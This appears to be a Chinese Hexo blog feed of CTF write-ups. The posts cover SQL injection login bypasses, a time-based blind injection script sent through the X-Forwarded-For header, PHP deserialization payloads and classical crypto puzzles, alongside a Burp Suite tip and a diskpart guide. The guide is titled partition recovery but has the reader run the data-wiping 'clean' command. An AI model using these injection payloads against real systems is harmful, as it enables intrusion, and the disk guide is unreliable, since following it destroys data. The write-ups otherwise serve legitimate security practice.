class="line">mysql_select_db(<span class="variable">$db</span>, <span class="variable">$con</span>);</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">"SELECT * FROM interest WHERE uname = '&#123;<span class="variable">$_POST</span>['uname']&#125;'"</span>;</span><br><span class="line"><span class="variable">$query</span> = mysql_query(<span class="variable">$sql</span>); </span><br><span class="line"><span class="keyword">if</span> (mysql_num_rows(<span class="variable">$query</span>) == 1) &#123; </span><br><span class="line">    <span class="variable">$key</span> = mysql_fetch_array(<span class="variable">$query</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$key</span>[<span class="string">'pwd'</span>] == <span class="variable">$_POST</span>[<span class="string">'pwd'</span>]) &#123;</span><br><span class="line">        <span class="built_in">print</span> <span class="string">"CTF&#123;XXXXXX&#125;"</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">print</span> <span class="string">"亦可赛艇！"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="built_in">print</span> <span class="string">"一颗赛艇！"</span>;</span><br><span class="line">&#125;</span><br><span class="line">mysql_close(<span class="variable">$con</span>);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>这里的思路是，利用group by pwd with rollup在查询中的一个特点，他可以返回pwd所在的那一条记录，通过limit控制返回哪一条，因此他不可以返回多条，一旦返回2条及以上，pwd就会为空，但同一条记录中的其他字段则是正常的</p><p>那么利用这一点令查询结果为空，我们输入的pwd也为空值，则构成了if(null==null)为true<br>即：输入的用户名为：’ or 1=1 group by pwd with rollup limit 1 offset 2 #<br>这里解释一下此时执行的SQL:<br>SELECT * FROM interest where uname=’ ‘ or 1=1<br>group by pwd with rollup  （在数据库中添加一行使得pwd=NULL）<br>limit 1 （只查询一行）<br>offset 2  （从第二行开始查询）</p><p>#注释<br>此时密码只要为空即可查询成功 </p><p><img src="24-4.png" alt></p><h2 id="who-are-you"><a href="#who-are-you" class="headerlink" title="who are you?"></a>who are you?</h2><p><img src="25-1.png" alt></p><p><img src="25-2.png" alt></p><p><img src="25-3.png" alt></p><p>发现逗号之后内容的都截断了</p><p><img src="25-4.png" alt></p><p>尝试xff注入<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line">url=<span class="string">"http://ctf5.shiyanbar.com/web/wonderkun/index.php"</span></span><br><span class="line">allString=string.lowercase + string.uppercase + string.digits</span><br><span class="line">flag=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(1,33):</span><br><span class="line">    <span class="keyword">for</span> str1 <span class="keyword">in</span> allString:</span><br><span class="line">        data=<span class="string">"11'+(select case when (substring((select flag from flag ) from &#123;0&#125; for 1 )='&#123;1&#125;') then sleep(4) else 1 end ) and '1'='1"</span>.format(str(i),str1)</span><br><span class="line">        headers=&#123;<span class="string">"x-forwarded-for"</span>:data&#125;</span><br><span class="line">        try:</span><br><span class="line">            res=requests.get(url,headers=headers,timeout=3)</span><br><span class="line">        except requests.exceptions.ReadTimeout, e:</span><br><span class="line">            flag += str1</span><br><span class="line">            <span class="built_in">print</span> flag</span><br><span class="line">            <span class="built_in">break</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">'flag:'</span> + flag</span><br></pre></td></tr></table></figure></p><p>即可跑出</p><p><img src="25-5.png" alt></p><h2 id="登陆一下好吗"><a href="#登陆一下好吗" class="headerlink" title="登陆一下好吗??"></a>登陆一下好吗??</h2><p><img src="26-1.png" alt></p><p><img src="26-2.png" alt></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span> = “select user from flag <span class="built_in">where</span> user=’\<span class="variable">$_POST</span>[‘user’]’ and password=’\<span class="variable">$_POST</span>[‘password’]’”;</span><br><span class="line">输入username= <span class="string">'='</span>   password= <span class="string">'='</span></span><br><span class="line"><span class="variable">$sql</span> = “select user from flag <span class="built_in">where</span> user=<span class="string">''</span>=<span class="string">''</span> and password=<span class="string">''</span>=<span class="string">''</span> </span><br><span class="line">user=”返回的是NULL=”也是符合条件的，最后就是</span><br><span class="line"><span class="variable">$sql</span> = “select user from flag <span class="built_in">where</span> 1 and 1”;</span><br></pre></td></tr></table></figure><p><img src="26-3.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> 实验吧 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 实验吧 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Burpsuite 中文乱码</title>
      <link href="/2018/02/01/Burpsuite-%E4%B8%AD%E6%96%87%E4%B9%B1%E7%A0%81/"/>
      <url>/2018/02/01/Burpsuite-%E4%B8%AD%E6%96%87%E4%B9%B1%E7%A0%81/</url>
      
        <content type="html"><![CDATA[<p>在做测试的时候总是遇到response中文乱码的问题。Google很多解决方案都是仅仅只修改burp字体。可是有些时候单纯修改字体问题依然会存在。后来发现还需要设置burp编码，目前问题暂时得到解决，以下记录问题过程及解决详情，供有需之人。</p><a id="more"></a><h2 id="burpsuite-response返回中文乱码，像下面这样："><a href="#burpsuite-response返回中文乱码，像下面这样：" class="headerlink" title="burpsuite response返回中文乱码，像下面这样："></a>burpsuite response返回中文乱码，像下面这样：</h2><p><img src="1.jpg" alt></p><h2 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h2><p>设置User options——Display——HTTP Message Display的Font为中文字体，比如宋体、微软雅黑等。然后设置Character Sets为Use a specific character set:UTF-8(这里吐槽下，windows默认选择的是Recognize automatically based on message headers，Mac则默认就是UTF-8，当时没发现这点，一直以为是字体原因 =.=！)<br>具体可见下图：</p><p><img src="2.jpg" alt></p><h2 id="解决后的效果如下图："><a href="#解决后的效果如下图：" class="headerlink" title="解决后的效果如下图："></a>解决后的效果如下图：</h2><p><img src="3.jpg" alt></p><p>Happy，burpsuite中文乱码问题解决。</p>]]></content>
      
      
      <categories>
          
          <category> 软件安装与使用 </category>
          
          <category> Burpsuite </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>西普实验吧-密码学</title>
      <link href="/2018/01/30/%E8%A5%BF%E6%99%AE%E5%AE%9E%E9%AA%8C%E5%90%A7-%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
      <url>/2018/01/30/%E8%A5%BF%E6%99%AE%E5%AE%9E%E9%AA%8C%E5%90%A7-%E5%AF%86%E7%A0%81%E5%AD%A6/</url>
      
        <content type="html"><![CDATA[<p>西普实验吧-密码学题目学习</p><a id="more"></a><h2 id="这里没有key"><a href="#这里没有key" class="headerlink" title="这里没有key"></a>这里没有key</h2><p><img src="1_1.png" alt></p><p><img src="1_2.png" alt></p><p><img src="1_3.png" alt></p><h2 id="chinese-hacker"><a href="#chinese-hacker" class="headerlink" title="chinese hacker"></a>chinese hacker</h2><p><img src="2_1.png" alt></p><p><img src="2_2.png" alt></p><p>ubuntu系统，所以安装了一下mdbtools<br>sudo apt-get install mdbtools mdbtools-gmdb mdbtools-dev</p><p><img src="2_3.png" alt></p><p><img src="2_4.png" alt></p><p>并不是base64加密，是base32解密即可</p><h2 id="压缩的问题"><a href="#压缩的问题" class="headerlink" title="压缩的问题"></a>压缩的问题</h2><p><img src="3_1.png" alt></p><p><img src="3_2.png" alt></p><p><img src="3_3.png" alt></p><p><img src="3_4.png" alt></p><p>用该段代码作为解压密码即可。</p><p><img src="3_5.png" alt></p><h2 id="一段奇怪的代码"><a href="#一段奇怪的代码" class="headerlink" title="一段奇怪的代码"></a>一段奇怪的代码</h2><p><img src="4_1.png" alt></p><p><img src="4_2.png" alt></p><p><img src="4_3.png" alt></p><h2 id="最近在论证一个问题，到底是先有鸡还是先有蛋"><a href="#最近在论证一个问题，到底是先有鸡还是先有蛋" class="headerlink" title="最近在论证一个问题，到底是先有鸡还是先有蛋"></a>最近在论证一个问题，到底是先有鸡还是先有蛋</h2><p><img src="5_1.png" alt></p><p>电脑键盘解密– key</p><h2 id="最近听说刘翔离婚了"><a href="#最近听说刘翔离婚了" class="headerlink" title="最近听说刘翔离婚了"></a>最近听说刘翔离婚了</h2><p><img src="6_1.png" alt></p><p><img src="6_2.png" alt></p><h2 id="摩擦摩擦"><a href="#摩擦摩擦" class="headerlink" title="摩擦摩擦"></a>摩擦摩擦</h2><p><img src="7_1.png" alt></p><p>摩斯密码解密</p><p><img src="7_2.png" alt></p><h2 id="凯撒是罗马共和国杰出的军事统帅"><a href="#凯撒是罗马共和国杰出的军事统帅" class="headerlink" title="凯撒是罗马共和国杰出的军事统帅"></a>凯撒是罗马共和国杰出的军事统帅</h2><p><img src="8_1.png" alt></p><p>凯撒解密</p><p><img src="8_2.png" alt></p><h2 id="古典密码的安全性不高，但仍然十分美妙，请破译下面的密文"><a href="#古典密码的安全性不高，但仍然十分美妙，请破译下面的密文" class="headerlink" title="古典密码的安全性不高，但仍然十分美妙，请破译下面的密文"></a>古典密码的安全性不高，但仍然十分美妙，请破译下面的密文</h2><p><img src="9_1.png" alt></p><p><img src="9_2.png" alt></p><h2 id="数码管"><a href="#数码管" class="headerlink" title="数码管"></a>数码管</h2><p><img src="10_1.png" alt></p><p><img src="10_2.png" alt></p><p><img src="10_3.jpeg" alt></p><p><img src="10_4.jpeg" alt></p><p><img src="10_5.jpeg" alt></p><h2 id="一个img文件"><a href="#一个img文件" class="headerlink" title="一个img文件"></a>一个img文件</h2><p>太麻烦不想弄</p><h2 id="keyboard"><a href="#keyboard" class="headerlink" title="keyboard"></a>keyboard</h2><p><img src="11_1.png" alt></p><p>BHUK,LP TGBNHGYT BHUK,LP UYGBN TGBNHGYT BHUK,LP BHUK,LP TGBNHGYT BHUK,LP TGBNHGYT UYGBN<br>提示键盘了，按照给出的字母顺序在键盘上画出字母的形状，就是答案</p><h2 id="密文-rot13"><a href="#密文-rot13" class="headerlink" title="密文 rot13"></a>密文 rot13</h2><p><img src="12_1.png" alt></p><p>先rot13再md5</p><p><img src="12_2.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> 实验吧 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 实验吧 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>磁盘分区恢复</title>
      <link href="/2017/12/29/%E7%A3%81%E7%9B%98%E5%88%86%E5%8C%BA%E6%81%A2%E5%A4%8D/"/>
      <url>/2017/12/29/%E7%A3%81%E7%9B%98%E5%88%86%E5%8C%BA%E6%81%A2%E5%A4%8D/</url>
      
        <content type="html"><![CDATA[<p>利用window自带的cmd命令恢复磁盘分区</p><a id="more"></a><h1 id="按windows键，右键点击运行，再左键点击以管理员身份运行"><a href="#按windows键，右键点击运行，再左键点击以管理员身份运行" class="headerlink" title="按windows键，右键点击运行，再左键点击以管理员身份运行"></a>按windows键，右键点击运行，再左键点击以管理员身份运行</h1><h3 id="输入diskpart-按enter"><a href="#输入diskpart-按enter" class="headerlink" title="输入diskpart,按enter"></a>输入diskpart,按enter</h3><p><img src="1.png" alt></p><h3 id="输入list-disk-按enter"><a href="#输入list-disk-按enter" class="headerlink" title="输入list disk,按enter"></a>输入list disk,按enter</h3><p><img src="2.png" alt></p><h3 id="输入select-disk-X-X代表磁盘后面的数字0、1，可磁盘的大小来判断数字是多少-按enter"><a href="#输入select-disk-X-X代表磁盘后面的数字0、1，可磁盘的大小来判断数字是多少-按enter" class="headerlink" title="输入select disk X(X代表磁盘后面的数字0、1，可磁盘的大小来判断数字是多少)按enter"></a>输入select disk X(X代表磁盘后面的数字0、1，可磁盘的大小来判断数字是多少)按enter</h3><p>选择后输入clean</p><p><img src="3.png" alt></p><p>搞定。</p>]]></content>
      
      
      <categories>
          
          <category> 经验分享 </category>
          
          <category> 磁盘 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 磁盘 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>快速抓取网页内容</title>
      <link href="/2017/12/28/%E5%BF%AB%E9%80%9F%E6%8A%93%E5%8F%96%E7%BD%91%E9%A1%B5%E5%86%85%E5%AE%B9/"/>
      <url>/2017/12/28/%E5%BF%AB%E9%80%9F%E6%8A%93%E5%8F%96%E7%BD%91%E9%A1%B5%E5%86%85%E5%AE%B9/</url>
      
        <content type="html"><![CDATA[<p>python 快速抓取网页内容 </p><a id="more"></a><h1 id="两道例题"><a href="#两道例题" class="headerlink" title="两道例题"></a>两道例题</h1><h2 id="题目1"><a href="#题目1" class="headerlink" title="题目1"></a>题目1</h2><p><img src="1.png" alt></p><p>python 代码：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import requests,re</span><br><span class="line">from base64 import b64decode</span><br><span class="line">s = requests.Session()</span><br><span class="line">url = <span class="string">'http://120.24.86.145:8002/web6/'</span></span><br><span class="line">r = s.get(url)</span><br><span class="line">head = r.headers</span><br><span class="line">flag = b64decode(head[<span class="string">'flag'</span>]).split(<span class="string">':'</span>)[1]</span><br><span class="line">flag = b64decode(‘flag’)</span><br><span class="line">r1 = s.post(url, data=&#123;<span class="string">'margin'</span>:flag&#125;)</span><br><span class="line"><span class="built_in">print</span> r1.text</span><br></pre></td></tr></table></figure></p><h2 id="题目2"><a href="#题目2" class="headerlink" title="题目2"></a>题目2</h2><p><img src="2.png" alt></p><p>python 代码：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import requests,re</span><br><span class="line">from base64 import b64decode</span><br><span class="line">s = requests.Session()</span><br><span class="line">url = <span class="string">'http://ctf5.shiyanbar.com/web/10/10.php'</span></span><br><span class="line">r = s.get(url)</span><br><span class="line">head = r.headers</span><br><span class="line">flag = b64decode(head[<span class="string">'flag'</span>]).split(<span class="string">':'</span>)[1]</span><br><span class="line">r1 = s.post(url, data=&#123;<span class="string">'key'</span>:flag&#125;)</span><br><span class="line"><span class="built_in">print</span> r1.text</span><br></pre></td></tr></table></figure></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>序列化漏洞</title>
      <link href="/2017/12/25/%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
      <url>/2017/12/25/%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<p>几个序列号漏洞的例子。</p><a id="more"></a><h2 id="题目1"><a href="#题目1" class="headerlink" title="题目1"></a>题目1</h2><p>神盾局的秘密</p><p>看下逻辑<br>看源码发现了<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=<span class="string">"showimg.php?img=c2hpZWxkLmpwZw=="</span> width=<span class="string">"100%"</span>/&gt;</span><br></pre></td></tr></table></figure></p><p>这里有个文件包含，base64 解码之后得到 shield.jpg</p><p>尝试读取 index.php</p><p><img src="1_4.png" alt></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">    require_once(<span class="string">'shield.php'</span>);</span><br><span class="line">    <span class="variable">$x</span> = new Shield();</span><br><span class="line">    isset(<span class="variable">$_GET</span>[<span class="string">'class'</span>]) &amp;&amp; <span class="variable">$g</span> = <span class="variable">$_GET</span>[<span class="string">'class'</span>];</span><br><span class="line">    <span class="keyword">if</span> (!empty(<span class="variable">$g</span>)) &#123;</span><br><span class="line">        <span class="variable">$x</span> = unserialize(<span class="variable">$g</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">echo</span> <span class="variable">$x</span>-&gt;readfile();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>利用同样的方法读取 shield.php</p><p><img src="1_4.png" alt></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    //flag is <span class="keyword">in</span> pctf.php</span><br><span class="line">    class Shield &#123;</span><br><span class="line">        public <span class="variable">$file</span>;</span><br><span class="line">        <span class="keyword">function</span> __construct(<span class="variable">$filename</span> = <span class="string">''</span>) &#123;</span><br><span class="line">            <span class="variable">$this</span> -&gt; file = <span class="variable">$filename</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">function</span> <span class="function"><span class="title">readfile</span></span>() &#123;</span><br><span class="line">            <span class="keyword">if</span> (!empty(<span class="variable">$this</span>-&gt;file) &amp;&amp; stripos(<span class="variable">$this</span>-&gt;file,<span class="string">'..'</span>)===FALSE  </span><br><span class="line">            &amp;&amp; stripos(<span class="variable">$this</span>-&gt;file,<span class="string">'/'</span>)===FALSE &amp;&amp; stripos(<span class="variable">$this</span>-&gt;file,<span class="string">'\\'</span>)==FALSE) &#123;</span><br><span class="line">                <span class="built_in">return</span> @file_get_contents(<span class="variable">$this</span>-&gt;file);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>最简单的序列化漏洞<br>直接利用脚本生成序列化的值<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    //flag is <span class="keyword">in</span> pctf.php</span><br><span class="line">    class Shield &#123;</span><br><span class="line">        public <span class="variable">$file</span>;</span><br><span class="line">        <span class="keyword">function</span> __construct(<span class="variable">$filename</span> = <span class="string">''</span>) &#123;</span><br><span class="line">            <span class="variable">$this</span> -&gt; file = <span class="variable">$filename</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">function</span> <span class="function"><span class="title">readfile</span></span>() &#123;</span><br><span class="line">            <span class="keyword">if</span> (!empty(<span class="variable">$this</span>-&gt;file) &amp;&amp; stripos(<span class="variable">$this</span>-&gt;file,<span class="string">'..'</span>)===FALSE  </span><br><span class="line">            &amp;&amp; stripos(<span class="variable">$this</span>-&gt;file,<span class="string">'/'</span>)===FALSE &amp;&amp; stripos(<span class="variable">$this</span>-&gt;file,<span class="string">'\\'</span>)==FALSE) &#123;</span><br><span class="line">                <span class="built_in">return</span> @file_get_contents(<span class="variable">$this</span>-&gt;file);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$q</span> = new Shield();</span><br><span class="line"><span class="variable">$q</span>-&gt;file = <span class="string">'pctf.php'</span>;</span><br><span class="line"><span class="built_in">echo</span> serialize(<span class="variable">$q</span>);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>或者：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    //flag is <span class="keyword">in</span> pctf.php</span><br><span class="line">    class Shield &#123;</span><br><span class="line">        public <span class="variable">$file</span>;</span><br><span class="line">        <span class="keyword">function</span> __construct(<span class="variable">$filename</span> = <span class="string">''</span>) &#123;</span><br><span class="line">            <span class="variable">$this</span> -&gt; file = <span class="variable">$filename</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$q</span> = new Shield();</span><br><span class="line"><span class="variable">$q</span>-&gt;file = <span class="string">'pctf.php'</span>;</span><br><span class="line"><span class="built_in">echo</span> serialize(<span class="variable">$q</span>);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>payload 如下：</p><p><img src="1_3.png" alt></p><p><img src="1_4.png" alt></p><h2 id="题目2"><a href="#题目2" class="headerlink" title="题目2"></a>题目2</h2><p>源代码：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class just4fun &#123;</span><br><span class="line">    var <span class="variable">$enter</span>;</span><br><span class="line">    var <span class="variable">$secret</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (isset(<span class="variable">$_GET</span>[<span class="string">'pass'</span>])) &#123;</span><br><span class="line">    <span class="variable">$pass</span> = <span class="variable">$_GET</span>[<span class="string">'pass'</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(get_magic_quotes_gpc())&#123;</span><br><span class="line">        <span class="variable">$pass</span>=stripslashes(<span class="variable">$pass</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$o</span> = unserialize(<span class="variable">$pass</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$o</span>) &#123;</span><br><span class="line">        <span class="variable">$o</span>-&gt;secret = <span class="string">"*"</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$o</span>-&gt;secret === <span class="variable">$o</span>-&gt;enter)</span><br><span class="line">            <span class="built_in">echo</span> <span class="string">"Congratulation! Here is my secret: "</span>.<span class="variable">$o</span>-&gt;secret;</span><br><span class="line">        <span class="keyword">else</span> </span><br><span class="line">            <span class="built_in">echo</span> <span class="string">"Oh no... You can't fool me"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="built_in">echo</span> <span class="string">"are you trolling?"</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>分析：<br>一个序列化过后的字符串与类中的变量始终保持相同，可以想到引用 a=&amp;b<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">poc：</span><br><span class="line">    &lt;?php   </span><br><span class="line">    class just4fun &#123;  </span><br><span class="line">        var <span class="variable">$enter</span>;  </span><br><span class="line">        var <span class="variable">$secret</span>;  </span><br><span class="line">        <span class="keyword">function</span> just4fun()  </span><br><span class="line">        &#123;  </span><br><span class="line">            <span class="variable">$this</span>-&gt;enter=&amp;<span class="variable">$this</span>-&gt;secret;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="built_in">echo</span> serialize(new just4fun());  </span><br><span class="line">    ?&gt;</span><br></pre></td></tr></table></figure></p><p>输出：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:8:<span class="string">"just4fun"</span>:2:&#123;s:5:<span class="string">"enter"</span>;N;s:6:<span class="string">"secret"</span>;R:2;&#125;</span><br></pre></td></tr></table></figure></p><p>payload：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pass=O:8:<span class="string">"just4fun"</span>:2:&#123;s:5:<span class="string">"enter"</span>;N;s:6:<span class="string">"secret"</span>;R:2;&#125;</span><br></pre></td></tr></table></figure></p><h2 id="题目3"><a href="#题目3" class="headerlink" title="题目3"></a>题目3</h2><p><img src="3_1.png" alt></p><p><img src="3_2.png" alt></p><p>点击没反应 根据提示加上 ?hint=1 发现源码</p><p><img src="3_3.png" alt></p><p>源码：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">include_once(<span class="string">"flag.php"</span>);</span><br><span class="line"><span class="variable">$cookie</span> = <span class="variable">$_COOKIE</span>[<span class="string">'ISecer'</span>];</span><br><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$_GET</span>[<span class="string">'hint'</span>]))&#123;</span><br><span class="line">    show_source(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">elseif (unserialize(<span class="variable">$cookie</span>) === <span class="string">"<span class="variable">$KEY</span>"</span>)</span><br><span class="line">&#123;   </span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"<span class="variable">$flag</span>"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$KEY</span>=<span class="string">'ISecer:www.isecer.com'</span>;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>分析：这题很奇怪<br>要传一个 cookie 名为 ISecer 的反序列的值。并且反序列后的值要全相等于 ”$KEY”<br>这里要注意是有双引号。<br>而且$KEY的传值是在此之后的。所以反序列的值不是 ’ISecer:<a href="http://www.isecer.com’。难道一开始" target="_blank" rel="noopener">www.isecer.com’。难道一开始</a> $key 的值是 “”???<br>我们要得到的值是 string(0) “” 所以序列化该值即可。</p><p><img src="3_4.png" alt></p><h2 id="题目4"><a href="#题目4" class="headerlink" title="题目4"></a>题目4</h2><p>bool 绕过</p><p><img src="4_1.png" alt></p><p><img src="4_2.png" alt></p><p>点击”登录”没反应，右击查看源代码，发现这么一段：</p><p><img src="4_3.png" alt></p><p>这里说明要为用户名传入一个字符串，并且它经过md5加密后要等于 0。<br>在某些情况下，PHP 会把类数值数据（如含有数字的字符串等）转换成数值处理，== 运算符就是其中之一。在使用 == 运算符对两个字符串进行松散比较时，PHP会把类数值的字符串转换为数值进行比较，如果参数是字符串，则返回字符串中第一个不是数字的字符之前的数字串所代表的整数值。比如: ‘3’ == ‘3ascasd’ 结果为 true。<br>因此只要找到一个字串加密后第一个字符为0即可，这里提供几个：240610708，aabg7XSs，aabC9RqS<br>在用户名处输入以上其中一个字符串，提交后出现提示： /user.php?fame=hjkleffifer</p><p>访问得到源代码：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$unserialize_str</span> = <span class="variable">$_POST</span>[<span class="string">'password'</span>];</span><br><span class="line"><span class="variable">$data_unserialize</span> = unserialize(<span class="variable">$unserialize_str</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$data_unserialize</span>[<span class="string">'user'</span>] == <span class="string">'???'</span> &amp;&amp; <span class="variable">$data_unserialize</span>[<span class="string">'pass'</span>]==<span 